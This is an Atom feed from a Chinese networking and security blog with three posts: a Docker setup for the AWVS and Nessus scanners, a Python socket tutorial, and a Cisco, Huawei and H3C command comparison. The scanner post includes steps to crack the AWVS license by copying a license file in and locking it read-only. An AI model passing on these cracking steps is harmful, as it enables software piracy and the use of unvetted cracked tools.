@@ -1,0 +1,2130 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://MaHule.github.io</id>
+    <title>一小步</title>
+    <updated>2022-10-06T09:33:09.924Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://MaHule.github.io"/>
+    <link rel="self" href="https://MaHule.github.io/atom.xml"/>
+    <subtitle>每天进步一点点</subtitle>
+    <logo>https://MaHule.github.io/images/avatar.png</logo>
+    <icon>https://MaHule.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2022, 一小步</rights>
+    <entry>
+        <title type="html"><![CDATA[漏扫工具：Docker 一键安装 AWVS 和 Nessus]]></title>
+        <id>https://MaHule.github.io/lou-sao-gong-ju-docker-yi-jian-an-zhuang-awvs-he-nessus/</id>
+        <link href="https://MaHule.github.io/lou-sao-gong-ju-docker-yi-jian-an-zhuang-awvs-he-nessus/">
+        </link>
+        <updated>2022-10-06T09:31:38.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="拉取镜像">拉取镜像</h2>
+<pre><code># pull 拉取下载镜像
+docker pull leishianquan/awvs-nessus:v4
+
+</code></pre>
+<h2 id="启动容器">启动容器</h2>
+<pre><code># 启动容器
+# -it 使用交互方式运行，进入容器查看内容
+# -d 后台运行
+# --name 命名容器
+# -p 主机端口:容器端口
+docker run -it -d -- -p 13443:3443 -p 18834:8834 leishianquan/awvs-nessus:v4 
+
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/cb424fe5a7751f8847862f154913a77d.png" alt="" loading="lazy"></figure>
+<h2 id="进入容器">进入容器</h2>
+<p>在容器中，我们需要</p>
+<ul>
+<li>启动 Nessus 服务</li>
+</ul>
+<pre><code># 需要注意的是访问Nessus需要进入容器启动Nessus 服务：
+# 查看容器
+docker ps  –a
+# 启动容器
+docker start 容器id  # id即启动容器时返回的字符串
+# 进入容器
+ docker exec –it 容器id /bin/bash
+# 启动nessus服务
+/etc/init.d/nessusd start
+
+
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/72f4734bcb1edf92f7a64f5f85ad8f2d.png" alt="" loading="lazy"></figure>
+<ul>
+<li>完成 awvs 破解</li>
+</ul>
+<pre><code># 破解awvs：
+cp /home/license_info.json /home/acunetix/.acunetix/data/license/
+
+# 注意！！！！
+## 在awvs运行过程中，license_info.json文件会被持续覆盖造成破解无效
+## 解决方法：在执行完cp命令, 将license_info.json设置为只读即可
+chmod 444 license_info.json
+
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/519fd3d998bf71274c3d49974b8f5d3e.png" alt="" loading="lazy"></figure>
+<h2 id="运行界面">运行界面</h2>
+<p>Nessus</p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/4acecb3bcf3d487b8adb4a5cb3194382.png" alt="" loading="lazy"></figure>
+<p>awvs</p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/6ecf92412fe49a4d80bd5889d44bcb24.png" alt="" loading="lazy"></figure>
+<p><strong>Nessus:</strong></p>
+<p>https://127.0.0.1:18834/</p>
+<p>nessus username:leishi</p>
+<p>nessus password:leishianquan</p>
+<p>**Awvs **: 13.0.200625101</p>
+<p>https://127.0.0.1:13443/</p>
+<p>awvs13 username: leishi@leishi.com</p>
+<p>awvs13 password: Leishi123</p>
+<h2 id="参考">参考</h2>
+<p><a href="http://www.iii80.com/?action=show&amp;id=938">漏洞扫描—Awvs&amp;Nessus(Docker 版 V3.0）更新</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Socket模块]]></title>
+        <id>https://MaHule.github.io/4.1 Socket模块/</id>
+        <link href="https://MaHule.github.io/4.1 Socket模块/">
+        </link>
+        <updated>2022-10-01T08:02:00.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="python安全socket模块">Python安全|Socket模块</h2>
+<blockquote>
+<p>提供两个基本的socket模块：服务端Socket和客户端Socket。当创建一个服务器端Socket之后，这个Socket会在本机的一个端口上等待连接，客户端Socket访问这个端口后，两者完成连接就可以进行交互。</p>
+</blockquote>
+<p><strong>Socket服务端建立：</strong>  首先实例化一个Socket类，然后开始循环监听，一直等待接收来自客户端的连接。成功建立连接之后，接收客户端发来的数据，并向客户端发送数据，传输完毕之后，关闭这次连接。</p>
+<p><strong>Socket客户端建立：</strong> 实例化一个Socket类之后连接一个远程的地址，这个地址由IP和端口组成。成功建立连接之后，开始发送和接收数据，传输完毕之后，关闭这次连接。</p>
+<h3 id="1-socket实例化">1. Socket实例化</h3>
+<pre><code class="language-python">s=socket.socket(family,type[,protocal])
+</code></pre>
+<ul>
+<li>
+<p>family : 使用的地址族。常用的地址族有：AF_INET、AF_INET6、AF_LOCAL（或称AF_UNIX   UNIX域Socket）、AF_ROUTE等。默认值为socket.AF_INET。</p>
+</li>
+<li>
+<p>type ： 指明Socket类型。使用值有三个（默认为sock_STREAM）：</p>
+</li>
+<li>
+<ul>
+<li>sock_STREAM，TCP类型，保证数据顺序及可靠性。</li>
+<li>sock_DGRAM，UCP类型，不保证数据接收的顺序，非可靠连接。</li>
+<li>sock_RAM，原始类型，允许对底层协议如IP和ICMP进行直接访问，基本不会用到</li>
+</ul>
+</li>
+<li>
+<p>protocal：指使用的协议，参数可选，通常赋值为“ 0 ”，由系统自动选择</p>
+</li>
+</ul>
+<pre><code class="language-python">#常用实例
+s = socket.socket()   #使用默认值，为TCP连接
+s = socket.socket(socket.AF_INET,socket.sock_DGRAM)   #建立一个UDP类型socket
+</code></pre>
+<h3 id="2socket常用函数">2.Socket常用函数</h3>
+<h4 id="1服务端函数">（1）服务端函数</h4>
+<ol>
+<li>bind()：由服务器端Socket调用，会将之前创建的Socket与指定的IP地址和端口绑定。如果之前使用AF_INET初始化Socket，那么这里可以使用元组（host，port）的形式表示地址。</li>
+</ol>
+<pre><code class="language-python">s.bind(('127.0.0.1',2345))
+</code></pre>
+<ol start="2">
+<li>listen()：用于在使用TCP的服务器端开启监听模式，可以使用一个参数来指定挂起的最大连接数量。这个参数的值最小为1，一般设置为5。</li>
+</ol>
+<pre><code class="language-python">s.listen(5)
+</code></pre>
+<ol start="3">
+<li>accept():用于在使用TCP的服务器端接收连接，一般是阻塞态。接收TCP连接并返回（conn，address），其中，conn是新的套接字对象，可以用来接收和发送数据；address是连接客户端的地址。</li>
+</ol>
+<h4 id="2客户端函数">（2）客户端函数</h4>
+<ol>
+<li>connect()：这个函数用在使用TCP的客户端去连接服务器端时，使用的参数是一个元组，形式为（hostname，port）。</li>
+</ol>
+<pre><code class="language-python">s.connect((&quot;127.0.0.1&quot;,2345))   #连接本机2345端口
+</code></pre>
+<h4 id="3通用函数">（3）通用函数</h4>
+<ol>
+<li>
+<p>send()：这个函数在使用TCP时用于发送数据，完整的形式为send(string[,flag])，利用这个函数可以将string代表的数据发送到已经连接的Socket，返回值是发送字节的数量，但是可能未全部发送指定的内容。</p>
+</li>
+<li>
+<p>sendall()：这个函数与send()相似，也在使用TCP时用于发送数据，完整的形式为sendall(string[,flag])，与send()的区别是它可以完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</p>
+</li>
+</ol>
+<pre><code class="language-python">s.sendall(bytes(&quot;Hello,My Friend!&quot;,encoding=&quot;utf-8&quot;))  #发送一段字符到连接的socket
+</code></pre>
+<ol start="3">
+<li>recv()：这个函数在使用TCP时用于接收数据，完整的形式为recv(bufsize[,flag])，接收Socket的数据。数据以字符串形式返回，bufsize指定最多可以接收的数量。一般不会使用参数flag。</li>
+</ol>
+<pre><code class="language-python">obj.recv(1024)   #接收一段长度为1024字符的Socket
+</code></pre>
+<ol start="4">
+<li>
+<p>sendto()：这个函数用于在使用UDP时发送数据，完整的形式为sendto(string [,flag],address)，返回值是发送的字节数。address是形式为（ipaddr，port）的元组，指定远程地址。</p>
+</li>
+<li>
+<p>recvfrom()：UDP专用，接收数据，返回数据远端的IP地址和端口，但返回值是（data，address）。其中，data是包含接收数据的字符串，address是发送数据的套接字地址。</p>
+</li>
+<li>
+<p>close()：关闭Socket。</p>
+</li>
+</ol>
+<h3 id="3socket简单通信服务器和客户端">3.Socket简单通信服务器和客户端</h3>
+<pre><code class="language-python">#Socket服务端
+import socket
+
+s1 = socket.socket()
+s1.bind(('127.0.0.1',2345))
+s1.listen(5)
+str = &quot;Hello World&quot;
+while 1:
+    conn,address = s1.accept()
+    print(&quot;a new connect from&quot;,address)
+    conn.send(str.encode())
+    conn.close
+</code></pre>
+<pre><code class="language-python">import socket
+
+s2 = socket.socket()
+s2.connect(('127.0.0.1',2345))
+#对传输数据使用encode()函数处理，Python3不再支持str类型传输，需要转换为bytes类型
+data = bytes.decode(s2.recv(1024))
+s2.close()
+print(data)
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[思科，华为，H3C常用命令对比]]></title>
+        <id>https://MaHule.github.io/si-ke-hua-wei-h3c-chang-yong-ming-ling-dui-bi/</id>
+        <link href="https://MaHule.github.io/si-ke-hua-wei-h3c-chang-yong-ming-ling-dui-bi/">
+        </link>
+        <updated>2022-09-02T12:59:43.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>思科、华为、H3C 这些网络设备的命令还是挺多的，不过我们一般用的路由交换机设备都是最简单的了，先学基本命令，再学其他功能命令。路由命令是最基本的命令了。思科、华为、H3C 常用命令对比大全：</strong></p>
+<table cellspacing="0" cellpadding="0"><tbody><tr><td valign="center" align="middle"><p><strong>CISCO</strong></p></td><td valign="center" align="middle"><p><strong>H3C</strong></p></td><td valign="center" align="middle" width="111"><p><strong>HUAWEI</strong></p></td><td valign="center" align="middle" width="78"><p>描述</p></td></tr><tr><td valign="center" align="middle"><p>no</p></td><td valign="center" align="middle"><p>undo</p></td><td valign="center" align="middle" width="111"><p>undo</p></td><td valign="center" align="middle" width="78"><p>取消、关闭当前设置</p></td></tr><tr><td valign="center" align="middle"><p>show</p></td><td valign="center" align="middle"><p>display</p></td><td valign="center" align="middle" width="111"><p>display</p></td><td valign="center" align="middle" width="78"><p>显示查看</p></td></tr><tr><td valign="center" align="middle"><p>exit</p></td><td valign="center" align="middle"><p>quit</p></td><td valign="center" align="middle" width="111"><p>quit</p></td><td valign="center" align="middle" width="78"><p>退回上级</p></td></tr><tr><td valign="center" align="middle"><p>hostname</p></td><td valign="center" align="middle"><p>sysname</p></td><td valign="center" align="middle" width="111"><p>sysname</p></td><td valign="center" align="middle" width="78"><p>设置主机名</p></td></tr><tr><td valign="center" align="middle"><p>en, config terminal</p></td><td valign="center" align="middle"><p>system-view</p></td><td valign="center" align="middle" width="111"><p>system-view</p></td><td valign="center" align="middle" width="78"><p>进入全局模式</p></td></tr><tr><td valign="center" align="middle"><p>delete</p></td><td valign="center" align="middle"><p>delete</p></td><td valign="center" align="middle" width="111"><p>delete</p></td><td valign="center" align="middle" width="78"><p>删除文件</p></td></tr><tr><td valign="center" align="middle"><p>reload</p></td><td valign="center" align="middle"><p>reboot</p></td><td valign="center" align="middle" width="111"><p>reboot</p></td><td valign="center" align="middle" width="78"><p>重启</p></td></tr><tr><td valign="center" align="middle"><p>write</p></td><td valign="center" align="middle"><p>save</p></td><td valign="center" align="middle" width="111"><p>save</p></td><td valign="center" align="middle" width="78"><p>保存当前配置</p></td></tr><tr><td valign="center" align="middle"><p>username</p></td><td valign="center" align="middle"><p>local-user</p></td><td valign="center" align="middle" width="111"><p>local-user</p></td><td valign="center" align="middle" width="78"><p>创建用户</p></td></tr><tr><td valign="center" align="middle"><p>shutdown</p></td><td valign="center" align="middle"><p>shutdown</p></td><td valign="center" align="middle" width="111"><p>shutdown</p></td><td valign="center" align="middle" width="78"><p>禁止、关闭 端口</p></td></tr><tr><td valign="center" align="middle"><p>show version</p></td><td valign="center" align="middle"><p>display version</p></td><td valign="center" align="middle" width="111"><p>display version</p></td><td valign="center" align="middle" width="78"><p>显示当前系统版本</p></td></tr><tr><td valign="center" align="middle"><p>show startup-config</p></td><td valign="center" align="middle"><p>display saved-configuration</p></td><td valign="center" align="middle" width="111"><p>display saved-configuration</p></td><td valign="center" align="middle" width="78"><p>查看已保存过的配置</p></td></tr><tr><td valign="center" align="middle"><p>show running-config</p></td><td valign="center" align="middle"><p>display current-configuration</p></td><td valign="center" align="middle" width="111"><p>display current-configuration</p></td><td valign="center" align="middle" width="78"><p>显示当前配置</p></td></tr><tr><td valign="center" align="middle"><p>no debug all</p></td><td valign="center" align="middle"><p>ctrl+d</p></td><td valign="center" align="middle" width="111"><p>ctrl+d</p></td><td valign="center" align="middle" width="78"><p>取消所有 debug 命令</p></td></tr><tr><td valign="center" align="middle"><p>erase startup-config</p></td><td valign="center" align="middle"><p>reset saved-configuration</p></td><td valign="center" align="middle" width="111"><p>reset saved-configuration</p></td><td valign="center" align="middle" width="78"><p>删除配置</p></td></tr><tr><td valign="center" align="middle"><p>end</p></td><td valign="center" align="middle"><p>return</p></td><td valign="center" align="middle" width="111"><p>return</p></td><td valign="center" align="middle" width="78"><p>退到用户视图</p></td></tr><tr><td valign="center" align="middle"><p>exit</p></td><td valign="center" align="middle"><p>logout</p></td><td valign="center" align="middle" width="111"><p>logout</p></td><td valign="center" align="middle" width="78"><p>登出</p></td></tr><tr><td valign="center" align="middle"><p>logging</p></td><td valign="center" align="middle"><p>info-center</p></td><td valign="center" align="middle" width="111"><p>info-center</p></td><td valign="center" align="middle" width="78"><p>指定信息中心配置信息</p></td></tr><tr><td valign="center" align="middle"><p>line</p></td><td valign="center" align="middle"><p>user-interface</p></td><td valign="center" align="middle" width="111"><p>user-interface</p></td><td valign="center" align="middle" width="78"><p>进入线路配置（用户接口）模式</p></td></tr><tr><td valign="center" align="middle"><p>start-config</p></td><td valign="center" align="middle"><p>saved-configuration</p></td><td valign="center" align="middle" width="111"><p>saved-configuration</p></td><td valign="center" align="middle" width="78"><p>启动配置</p></td></tr><tr><td valign="center" align="middle"><p>running-config</p></td><td valign="center" align="middle"><p>current-configuration</p></td><td valign="center" align="middle" width="111"><p>current-configuration</p></td><td valign="center" align="middle" width="78"><p>当前配置</p></td></tr><tr><td valign="center" align="middle"><p>host</p></td><td valign="center" align="middle"><p>ip host</p></td><td valign="center" align="middle" width="111"><p>ip host</p></td><td valign="center" align="middle" width="78"><p>host 名字和 ip 地址对应</p></td></tr><tr><td valign="center" colspan="4" align="middle" width="67"><p><strong>交换部分</strong></p></td></tr><tr><td valign="center" align="middle"><p>enable password</p></td><td valign="center" align="middle"><p>set authentication password simple</p></td><td valign="center" align="middle" width="111"><p>set authentication password simple</p></td><td valign="center" align="middle" width="78"><p>配置明文密码</p></td></tr><tr><td valign="center" align="middle"><p>interface type/number</p></td><td valign="center" align="middle"><p>interface type/number</p></td><td valign="center" align="middle" width="111"><p>interface type/number</p></td><td valign="center" align="middle" width="78"><p>进入接口</p></td></tr><tr><td valign="center" align="middle"><p>interface vlan 1</p></td><td valign="center" align="middle"><p>interface vlan 1</p></td><td valign="center" align="middle" width="111"><p>interface vlan 1</p></td><td valign="center" align="middle" width="78"><p>进入 vlan 配置 vlan 管理地址</p></td></tr><tr><td valign="center" align="middle"><p>interface rang</p></td><td valign="center" align="middle"><p>interface ethID to ID</p></td><td valign="center" align="middle" width="111"><p>interface ethID to ID</p></td><td valign="center" align="middle" width="78"><p>定议多个端口的组</p></td></tr><tr><td valign="center" align="middle"><p>enabl esecret</p></td><td valign="center" align="middle"><p>super password</p></td><td valign="center" align="middle" width="111"><p>super password</p></td><td valign="center" align="middle" width="78"><p>设置特权口令</p></td></tr><tr><td valign="center" align="middle"><p>duplex (half|full|auto)</p></td><td valign="center" align="middle"><p>duplex (half|full|auto)</p></td><td valign="center" align="middle" width="111"><p>duplex (half|full|auto)</p></td><td valign="center" align="middle" width="78"><p>配置接口状态</p></td></tr><tr><td valign="center" align="middle"><p>speed (10/100/1000)</p></td><td valign="center" align="middle"><p>speed (10/100/1000)</p></td><td valign="center" align="middle" width="111"><p>speed (10/100/1000)</p></td><td valign="center" align="middle" width="78"><p>配置端口速率</p></td></tr><tr><td valign="center" align="middle"><p>switchport mode trunk</p></td><td valign="center" align="middle"><p>port link-type trunk</p></td><td valign="center" align="middle" width="111"><p>port link-type trunk</p></td><td valign="center" align="middle" width="78"><p>配置 trunk</p></td></tr><tr><td valign="center" align="middle"><p>vlan ID /no vlan ID</p></td><td valign="center" align="middle"><p>vlan batch ID /undo vlan batch ID</p></td><td valign="center" align="middle" width="111"><p>vlan batch ID /undo vlan batch ID</p></td><td valign="center" align="middle" width="78"><p>添加、删除 vlan</p></td></tr><tr><td valign="center" align="middle"><p>switchport access vlan</p></td><td valign="center" align="middle"><p>port default vlan ID</p></td><td valign="center" align="middle" width="111"><p>port acces vlan ID</p></td><td valign="center" align="middle" width="78"><p>将端口接入 vlan</p></td></tr><tr><td valign="center" align="middle"><p>show interface</p></td><td valign="center" align="middle"><p>display interface</p></td><td valign="center" align="middle" width="111"><p>display interface</p></td><td valign="center" align="middle" width="78"><p>查看接口</p></td></tr><tr><td valign="center" align="middle"><p>show vlan ID</p></td><td valign="center" align="middle"><p>display vlan ID</p></td><td valign="center" align="middle" width="111"><p>display vlan ID</p></td><td valign="center" align="middle" width="78"><p>查看 vlan</p></td></tr><tr><td valign="center" align="middle"><p>encapsulation</p></td><td valign="center" align="middle"><p>link-protocol</p></td><td valign="center" align="middle" width="111"><p>link-protocol</p></td><td valign="center" align="middle" width="78"><p>封装协议</p></td></tr><tr><td valign="center" align="middle"><p>channel-group 1 mode on</p></td><td valign="center" align="middle"><p>port link-aggregation group 1</p></td><td valign="center" align="middle" width="111"><p>port link-aggregation group 1</p></td><td valign="center" align="middle" width="78"><p>链路聚合</p></td></tr><tr><td valign="center" align="middle"><p>ip routing</p></td><td valign="center" align="middle"><p>默认开启</p></td><td valign="center" align="middle" width="111"><p>默认开启</p></td><td valign="center" align="middle" width="78"><p>开启三层交换的路由功能</p></td></tr><tr><td valign="center" align="middle"><p>no switchport</p></td><td valign="center" align="middle"><p>不支持</p></td><td valign="center" align="middle" width="111"><p>不支持</p></td><td valign="center" align="middle" width="78"><p>开启接口三层功能</p></td></tr><tr><td valign="center" align="middle"><p>vtp domain</p></td><td valign="center" align="middle"><p>GVRP</p></td><td valign="center" align="middle" width="111"><p>GVRP</p></td><td valign="center" align="middle" width="131"><p>对跨以太网交换机的 VLAN 进行动态注册和删除</p></td></tr><tr><td valign="center" align="middle"><p>spanning-tree vlan ID root primary</p></td><td valign="center" align="middle"><p>stp instance id root primary</p></td><td valign="center" align="middle" width="111"><p>stp instance id root primary</p></td><td valign="center" align="middle" width="78"><p>stp 配置根网桥</p></td></tr><tr><td valign="center" align="middle"><p>spanning-tree vlan ID priority</p></td><td valign="center" align="middle"><p>stp primary vlaue</p></td><td valign="center" align="middle" width="111"><p>stp primary vlaue</p></td><td valign="center" align="middle" width="78"><p>配置网桥优先级</p></td></tr><tr><td valign="center" align="middle"><p>show spanning-tree</p></td><td valign="center" align="middle"><p>dis stp brief</p></td><td valign="center" align="middle" width="111"><p>dis stp brief</p></td><td valign="center" align="middle" width="78"><p>查看 STP 配置</p></td></tr><tr><td valign="center" colspan="4" align="middle" width="67"><p><strong>路由部分</strong></p></td></tr><tr><td valign="center" align="middle"><p>ip route 0.0.0.0 0.0.0.0</p></td><td valign="center" align="middle"><p>ip route-static 0.0.0.0 0.0.0.0</p></td><td valign="center" align="middle" width="111"><p>ip route-static 0.0.0.0 0.0.0.0</p></td><td valign="center" align="middle" width="78"><p>配置默认路由</p></td></tr><tr><td valign="center" align="middle"><p>ip route 目标网段 + 掩码 下一跳</p></td><td valign="center" align="middle"><p>ip route-static 目标网段 + 掩码 下一跳</p></td><td valign="center" align="middle" width="111"><p>ip route-static 目标网段 + 掩码 下一跳</p></td><td valign="center" align="middle" width="78"><p>配置静态路由</p></td></tr><tr><td valign="center" align="middle"><p>show ip route</p></td><td valign="center" align="middle"><p>display ip routing-table</p></td><td valign="center" align="middle" width="111"><p>display ip routing-table</p></td><td valign="center" align="middle" width="78"><p>查看路由表</p></td></tr><tr><td valign="center" align="middle"><p>router rip /network 网段</p></td><td valign="center" align="middle"><p>rip /network 网段</p></td><td valign="center" align="middle" width="111"><p>rip /network 网段</p></td><td valign="center" align="middle" width="78"><p>启用 rip、并宣告网段</p></td></tr><tr><td valign="center" align="middle"><p>router ospf</p></td><td valign="center" align="middle"><p>ospf</p></td><td valign="center" align="middle" width="111"><p>ospf</p></td><td valign="center" align="middle" width="78"><p>启用 ospf</p></td></tr><tr><td valign="center" align="middle"><p>network ip 反码 area &lt;area-id&gt;</p></td><td valign="center" align="middle"><p>area &lt;area-id&gt;</p></td><td valign="center" align="middle" width="111"><p>area &lt;area-id&gt;</p></td><td valign="center" align="middle" width="78"><p>配置 OSPF 区域</p></td></tr><tr><td valign="center" align="middle"><p>no auto-summary</p></td><td valign="center" align="middle"><p>rip split-horizon</p></td><td valign="center" align="middle" width="111"><p>rip split-horizon</p></td><td valign="center" align="middle" width="78"><p>配置 RIP V2 水平分割</p></td></tr><tr><td valign="center" align="middle"><p>show ip protocol</p></td><td valign="center" align="middle"><p>display ip protocol</p></td><td valign="center" align="middle" width="111"><p>display ip protocol</p></td><td valign="center" align="middle" width="78"><p>查看路由协议</p></td></tr><tr><td valign="center" align="middle"><p>access-list 1-99 permit/deny IP</p></td><td valign="center" align="middle"><p>rule id permit source IP</p></td><td valign="center" align="middle" width="111"><p>rule id permit source IP</p></td><td valign="center" align="middle" width="78"><p>标准访问控制列表</p></td></tr><tr><td valign="center" align="middle"><p>access-list 100-199 permit/deny protocol source IP + 反码 destination IP + 反码 operator operan</p></td><td valign="center" align="middle"><p>rule {normal|special}{permit|deny}{tcp|udp}source {&lt;ip wild&gt;|any}destination &lt;ip wild&gt;|any}[operate]</p></td><td valign="center" align="middle" width="111"><p>rule {normal|special}{permit|deny}{tcp|udp}source {&lt;ip wild&gt;|any}destination &lt;ip wild&gt;|any}[operate]</p></td><td valign="center" align="middle" width="78"><p>扩展访问控制列表</p></td></tr><tr><td valign="center" align="middle"><p>standby group-number ip virtual-ip</p></td><td valign="center" align="middle"><p>vrrp vrid number virtual-ip</p></td><td valign="center" align="middle" width="111"><p>vrrp vrid number virtual-ip</p></td><td valign="center" align="middle" width="78"><p>配置 HSRP 组</p></td></tr><tr><td valign="center" align="middle"><p>standby group-number priority</p></td><td valign="center" align="middle"><p>vrrp vrid number priority</p></td><td valign="center" align="middle" width="111"><p>vrrp vrid number priority</p></td><td valign="center" align="middle" width="78"><p>配置 HSRP 优先级</p></td></tr><tr><td valign="center" align="middle"><p>standby group-number preempt</p></td><td valign="center" align="middle"><p>vrrp vrid number preempt-mode</p></td><td valign="center" align="middle" width="111"><p>vrrp vrid number preempt-mode</p></td><td valign="center" align="middle" width="78"><p>配置 HSRP 占先权</p></td></tr><tr><td valign="center" align="middle"><p>standby group-number track</p></td><td valign="center" align="middle"><br></td><td valign="center" align="middle" width="111"><br></td><td valign="center" align="middle" width="78"><p>配置端口跟踪</p></td></tr><tr><td valign="center" align="middle"><p>ip nat inside source static</p></td><td valign="center" align="middle"><p>nat server global &lt;ip&gt; [port] inside &lt;ip&gt; port [protocol]</p></td><td valign="center" align="middle" width="111"><p>nat server global &lt;ip&gt; [port] inside &lt;ip&gt; port [protocol]</p></td><td valign="center" align="middle" width="78"><p>配置静态地址转换</p></td></tr><tr><td valign="center" align="middle"><br></td><td valign="center" align="middle"><br></td><td valign="center" align="middle" width="111"><br></td><td valign="center" align="middle" width="78"><br></td></tr></tbody></table>
+<p><strong>cisco 常用命令解释</strong></p>
+<p><strong>视图模式介绍：</strong></p>
+<p>普通视图 router&gt;</p>
+<p>特权视图 router# / 在普通模式下输入 enable</p>
+<p>全局视图 router(config)# / 在特权模式下输入 config t</p>
+<p>接口视图 router(config-if)# / 在全局模式下输入 int 接口名称 例如 int s0 或 int e0</p>
+<p>路由协议视图 router（config-route）# / 在全局模式下输入 router 动态路由协议名称</p>
+<p><strong>1、基本配置：</strong></p>
+<p>router&gt;enable / 进入特权模式</p>
+<p>router#conf t / 进入全局配置模式</p>
+<p>router(config)#hostname xxx / 设置设备名称就好像给我们的计算机起个名字</p>
+<p>router(config)#enable password / 设置特权口令</p>
+<p>router(config)#no ip domain-lookup / 不允许路由器缺省使用 DNS 解析命令</p>
+<p>router(config)#line console 0 / 进入控制口的服务模式</p>
+<p>router(config-line)#password xxx / 要设置 console 的密码</p>
+<p>router(config-line)#login / 使能可以登陆</p>
+<p>router(config-line)#logging synchronous / 日志同步</p>
+<p>router(config-line)#exec-timeout 0 0 / 设置时间溢出为 0</p>
+<p>router(config-line)#line vty 0 4 / 进入设置 telnet 服务模式</p>
+<p>router(config-line)#password xxx / 设置 telnet 的密码</p>
+<p>router(config-line)#login / 使能可以登陆</p>
+<p>router(config-line)#exit / 保存退出到特权模式</p>
+<p>router(config)# Service password-encrypt / 对所有在路由器上输入的口令进行暗文加密</p>
+<p><strong>2、接口配置：</strong></p>
+<p>router(config)#interface serial0 / 进入接口配置模式 serial 0 端口配置（如果是模块化的路由器前面加上槽位编号，例如 serial0/0 代表这个路由器的 0 槽位上的第一个接口）</p>
+<p>router(config-if)#ip address xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx / 添加 ip 地址和掩码</p>
+<p>router(config-if)#enca hdl/ppp 捆绑链路协议 hdlc 或者 ppp 思科缺省串口封装的链路层协议是 HDLC 所以在 show run 配置的时候接口上的配置没有，如果要封装为别的链路层协议例如 PPP/FR/X25 就是看到接口下的 enca ppp 或者 enca fr</p>
+<p>router(config)#int loopback / 建立环回口 (逻辑接口) 模拟不同的本机网段</p>
+<p>router(config-if)#ip add xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx / 添加 ip 地址和掩码给环回口</p>
+<p>router(config-if)#no shutdown / 在物理接口上配置了 ip 地址后用 no shut 启用这个物理接口反之可以用 shutdown 管理性的关闭接口</p>
+<p><strong>3、路由配置：</strong></p>
+<p>(1) 静态路由</p>
+<p>router(config)#ip route xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx 下一条或自己的接口</p>
+<p>router(config)#ip route 0.0.0.0 0.0.0.0 s 0 添加缺省路由</p>
+<p>(2) 动态路由</p>
+<p>rip 协议</p>
+<p>router(config)#router rip / 启动 rip 协议</p>
+<p>router(config-router)#network xxx.xxx.xxx.xxx / 宣告自己的网段</p>
+<p>router(config-router)#version 2 转换为 rip 2 版本</p>
+<p>router(config-router)#no auto-summary / 关闭自动汇总功能，rip V2 才有作用</p>
+<p>router(config-router)# passive-int 接口名 / 启动本路由器的那个接口为被动接口</p>
+<p>router(config-router)# nei xxx.xxx.xxx.xxx / 广播转单播报文，指定邻居的接 ip</p>
+<p><strong>igrp 协议</strong></p>
+<p>router(config)#router igrp xxx / 启动 igrp 协议</p>
+<p>router(config-router)#network xxx.xxx.xxx.xxx / 宣告自己的网段</p>
+<p>router(config-router)#variance xxx / 调整倍数因子，使用不等价的负载均衡</p>
+<p><strong>eigrp 协议</strong></p>
+<p>router(config)router eigrp xxx / 启动协议</p>
+<p>router(config-router)#network xxx.xxx.xxx.xxx / 宣告自己的网段</p>
+<p>router(config-router)#variance xxx / 调整倍数因子，使用不等价的负载均衡</p>
+<p>router(config-router)#no auto-summary / 关闭自动汇总功能</p>
+<p><strong>ospf 协议</strong></p>
+<p>router(config)router ospf xxx / 启动协议启动一个 OSPF 协议进程</p>
+<p>router(config-router)network xxx.xxx.xxx.xxx area xxx / 宣告自己的接口或网段在 ospf 的区域中可以把不同接口宣告在不同区域中</p>
+<p>router(config-router)router-id xxx.xxx.xxx.xxx / 配置路由的 id</p>
+<p>router(config-router)aera xxx stub / 配置 xxx 区域为末梢区域 加入这个区域的路由器全部要配置这个条命令</p>
+<p>router(config-router)aera xxx stub no-summary / 配置 xxx 区域为完全末梢区域 只在 ABR 上配置</p>
+<p>router(config-router)aera xxx nssa / 配置 xxx 区域为非纯末梢区域加入这个区域的路由器全部要配置这个条命令</p>
+<p>router(config-router)aera xxx nssa no-summary / 配置 xxx 区域为完全非纯末梢区域 只在 ABR 上配置, 并发布缺省路由信息进入这个区域内的路由器</p>
+<p><strong>4、保存当前修改 / 运行的配置：</strong></p>
+<p>router#write / 将 RAM 中的当前配置存储到 NVRAM 中，下次路由器启动就是</p>
+<p>执行保存的配置</p>
+<p>router#Copy running-config startup-config / 命令与 write 效果一样</p>
+<p><strong>5、一般的常用命令</strong></p>
+<p>router(config-if)#exit</p>
+<p>router(config)#</p>
+<p>router(config-router)#exit</p>
+<p>router(config)#</p>
+<p>router(config-line)#exit</p>
+<p>router(config)#</p>
+<p>router(config)#exit</p>
+<p>router#</p>
+<p>exit 命令 / 从接口、协议、line 等视图模式下退回到全局配置模式，或从全局配置模式退回到特权模式</p>
+<p>router(config-if)#end</p>
+<p>router(config-router)#end</p>
+<p>router(config-line)#end</p>
+<p>router#</p>
+<p>end 命令 / 从任何视图直接回到特权模式</p>
+<p>router#Logout / 退出当前路由器登陆模式相对与 windows 的注销</p>
+<p>router#reload / 重新启动路由器（热启动）冷启动就是关闭路由器再打开电源开关</p>
+<p><strong>特权模式下：</strong></p>
+<p>router#show ip route / 查看当前的路由表</p>
+<p>router#clear ip route * / 清楚当前的路由表</p>
+<p>router#show ip protocol / 查看当前路由器运行的动态路由协议情况</p>
+<p>router#show ip int brief / 查看当前的路由器的接口 ip 地址启用情况</p>
+<p>router#show running-config / 查看当前运行配置</p>
+<p>router#show startup-config / 查看启动配置</p>
